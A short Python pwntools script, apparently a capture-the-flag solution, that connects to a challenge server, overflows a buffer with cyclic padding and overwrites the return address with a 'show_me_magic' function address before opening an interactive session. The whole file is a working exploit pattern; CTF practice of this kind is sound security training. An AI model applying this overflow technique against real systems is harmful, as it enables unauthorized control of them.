from pwn import *
import struct

# print(cyclic(100))
# print(cyclic_find(b'l', n=1))

ip = 'ctf.adl.tw'
port = 11001

r = remote(ip, port)
show_me_magic = 0x000000bae5894855

payload = "aaaabaaacaaadaaaeaaafaaa"
payload += p64(show_me_magic)

r.send(payload)
r.interactive()

